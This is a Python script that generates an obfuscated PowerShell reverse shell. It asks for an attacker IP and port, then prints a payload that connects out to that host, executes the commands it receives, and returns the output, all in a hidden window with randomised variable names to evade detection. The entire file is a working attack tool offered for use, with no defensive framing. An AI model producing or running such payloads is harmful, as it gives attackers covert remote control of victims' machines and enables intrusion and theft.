import random
import string

# Function to generate random variable names
def random_variable_name(size=4):
    return ''.join(random.choice(string.ascii_letters) for _ in range(size))

def generate_obfuscated_powershell_script(ip_address, port_number):
    # PowerShell script template using f-strings for better readability
    template = f"""
Start-Process $PSHOME\\powershell.exe -ArgumentList {{
    ${{var1}} = New-Object System.Net.Sockets.TCPClient('{ip_address}',{port_number});
    ${{var2}} = ${{var1}}.GetStream();
    [byte[]]${{var3}} = 0..65535|%{{0}};
    while((${{var4}} = ${{var2}}.Read(${{var3}}, 0, ${{var3}}.Length)) -ne 0){{
        ${{var5}} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${{var3}},0,${{var4}});
        ${{var6}} = (iex ${{var5}} 2>&1 | Out-String);
        ${{var7}} = ${{var6}} + 'PS ' + (Get-Location).Path + '> ';
        ${{var8}} = ([text.encoding]::ASCII).GetBytes(${{var7}});
        ${{var2}}.Write(${{var8}},0,${{var8}}.Length);
        ${{var2}}.Flush();
    }};
    ${{var1}}.Close();
}} -WindowStyle Hidden
"""

    # Generate random variable names
    variables = {f"var{i}": random_variable_name() for i in range(1, 9)}

    # Replace the placeholders with actual random variable names
    for i in range(1, 9):
        template = template.replace(f"${{var{i}}}", f"${random_variable_name()}")

    return template

# Ask the user for the IP and port
ip = input("Enter the IP address: ")
port = input("Enter the port number: ")

# Generate and display the obfuscated PowerShell script
ps_script = generate_obfuscated_powershell_script(ip, port)
print(ps_script)
